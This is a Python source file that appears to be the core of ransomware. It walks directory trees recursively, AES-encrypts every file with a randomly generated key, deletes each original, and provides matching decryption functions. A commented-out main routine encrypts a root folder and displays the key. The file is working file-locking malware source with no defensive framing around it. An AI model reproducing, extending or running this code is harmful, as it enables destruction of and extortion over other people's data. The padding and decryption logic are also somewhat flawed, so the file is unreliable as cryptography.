import config as cfg

def launch_encryption(dl):
    i = 0
    key = cfg.random.randbytes(cfg.keysize)

    while(i < len(dl)):
        d = dl[i]
        files = cfg.os.listdir(d)
        for f in files:
            fullpath = d + "/" + f
            if(cfg.os.path.isfile(fullpath)):
                encrypt_file(fullpath, key)
                cfg.os.remove(fullpath)
                pass

            elif(cfg.os.path.isdir(fullpath)):
                dl.append(fullpath)
        i +=1
    return key

def encrypt_file(file, key):
    chunk_size = 65536
    output = cfg.os.path.join(cfg.os.path.dirname(file), cfg.os.path.basename(file) + cfg.suffix + ".0")
    
    try:
        output = cfg.os.path.splitext(file)[0]  + "." + str(int(cfg.os.path.splitext(file)[1][1]) + 1)
    except:
        pass

    file_size =  str(cfg.os.path.getsize(file)).zfill(cfg.keysize)
    iv = cfg.os.urandom(cfg.keysize)
    encryptor = cfg.AES.new(key, cfg.AES.MODE_CBC, iv)

    with open(file, "rb") as (infile):
        with open(output, "wb") as (outfile):
            outfile.write(bytes(file_size, "utf-8"))
            outfile.write(iv)
            while True:
                chunk = infile.read(chunk_size)
                if len(chunk) == 0:
                    break
                else:
                    if len(chunk) % cfg.keysize != 0:
                        chunk += b' ' * (cfg.keysize - len(chunk) % cfg.keysize)
                outfile.write(encryptor.encrypt(chunk))

def launch_decryption(dl, key):
    i = 0
    while(i < len(dl)):
        d = dl[i]
        files = cfg.os.listdir(d)
        for f in files:
            fullpath = d + "/" + f
            if(cfg.os.path.isfile(fullpath) and cfg.os.path.splitext(fullpath)[1] == cfg.suffix):
                decrypt_file(fullpath, key)
                cfg.os.remove(fullpath)
                pass

            elif(cfg.os.path.isdir(fullpath)):
                dl.append(fullpath)
        i +=1

def decrypt_file(file, key):
    chunk_size = 65536

    with open(file, "rb") as (infile):
        file_size = infile.read(cfg.keysize)
        iv = infile.read(cfg.keysize)
        decryptor = cfg.AES.new(key, cfg.AES.MODE_CBC, iv)
        output = cfg.os.path.join(cfg.os.path.dirname(file).replace(cfg.suffix, ""), cfg.os.path.basename(file)).replace(cfg.suffix, "", 1)
        with open(output, "wb") as (outfile): 
            while True:
                chunk = infile.read(chunk_size)
                if len(chunk) == 0:
                    break
                else:
                    outfile.write(decryptor.decrypt(chunk))

"""def main():
    files = cfg.os.listdir(cfg.root_path)
    for f in files:
        cfg.shutil.copyfile(cfg.root_path + f, cfg.safe_path + f)

    key = cfg.random.randbytes(16)
    key = key.replace(b'"', b"'")
    print(key)
    for f in files:
        encrypt_file(cfg.root_path + f, key)
        cfg.os.remove(cfg.root_path + f)
    
    cfg.dsp.display(key)

if __name__ == "__main__":
    main()"""
